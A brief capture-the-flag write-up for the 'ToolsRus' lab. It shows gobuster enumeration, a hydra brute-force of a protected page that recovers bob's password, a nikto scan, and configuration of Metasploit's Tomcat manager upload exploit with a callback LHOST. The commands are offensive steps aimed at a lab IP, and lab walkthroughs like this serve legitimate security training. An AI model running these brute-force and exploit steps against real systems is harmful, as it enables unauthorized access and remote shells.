# ToolsRus

# Using Gobuster Directory Scan

Command:

`gobuster -u "http://10.10.54.107/" -w "/usr/share/dirbuster/wordlist/directory-list-2.3-medium.txt" -t 150 -o "gobuster.txt"`

Output:

- we got 3 directory

1. guideline

    - after the visit this i got username `bob`

2. protected

3. server-status

    - This protected web-page ask login credintials, so now it time to use next tool

# Using Hydra Tools

Command:

`hydra -l "bob" -P "rockyou.txt" -s 80 -f 10.10.54.107 http-get /protected -o "hydra.txt"`

Output:

- Password is `bubbles`

- wooowww, we got and password.

## Using Nikto Tool

Command:

`nikto "http://10.10.54.107:1234/manager/html" -id bob:bubbles -o "nikto.txt"`

Output:

- Output gives us lots of info about server and files.

## Using Metasploit Tool

- lets enumerate the each services which running on ports.

- In the port 1234 Tomcat/Coyota service is running is on which is vulnerable, for more details [link]("https://charlesreid1.com/wiki/Metasploitable/Apache/Tomcat_and_Coyote")

- So we use `multi/http/tomcat_mgr_upload` exploit

- setup some variables RHOSTS:[Target Machine IP], RPORT:1234, LHOST[Own tun0 IP], HttpUsername:bob, HttpPassword:bubbles
